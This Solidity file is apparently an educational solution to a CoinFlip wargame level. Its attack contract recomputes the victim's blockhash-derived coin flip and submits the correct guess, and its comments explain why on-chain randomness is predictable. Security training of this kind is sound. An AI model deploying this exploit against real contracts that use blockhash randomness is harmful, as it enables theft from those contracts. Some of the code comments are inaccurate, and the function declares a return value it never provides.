// SPDX-License-Identifier: MIT
// fixed pragma
pragma solidity 0.5.0; 

import "./CoinFlip.sol";
// outdated import for SafeMath, pragma 0.8.0 has SafeMath included in version
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

/// @title attack contract, calculates correct side 10 times in a row
/// @author Web3 Blockchain Developer 
contract CoinFlipAttack {
    /// @notice public state variable assigned in constructor
    CoinFlip public victimContract; 
    
    // state variable assigned in function flip()
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    /** @notice victim address belonging to CoinFlip assigned as public state variable victimContract 
    during deployment of attack contract */
    constructor(address _victimContractAddr) public {
        victimContract = CoinFlip(_victimContractAddr);
    }

    /// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
    function flip() public returns(bool) {
        /** custom:notice blockhash and block.number are globally accessible variables available to everyone 
        this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip
        best practice to introduce a source of randomness into a contract would be to use a decentralized oracle to compute 
        random numbers, because there is no native way to generate random numbers in Solidity and everything is
        publicly visible in the contract */ 
        /* local variable blockValue is assigned 
        using the uint256 integer from the hash of the last block number */ 
        uint256 blockValue = uint256(blockhash(block.number -1));
        /** @custom:notice local variable coinFlip assigned using the local variable blockValue 
        divided by the state variable FACTOR */
        uint256 coinFlip = uint256(blockValue/FACTOR);
        /** @custom:notice local variable side is assigned as a correct _guess if 
        coinFlip is equal to 1 and is declared as true */
        bool side = coinFlip == 1 ? true : false;

        /** @custom:notice player calls function flip() inherited from victim contract 
        and entered as correct guess side every flip to complete this level! */
        victimContract.flip(side);
    }
}
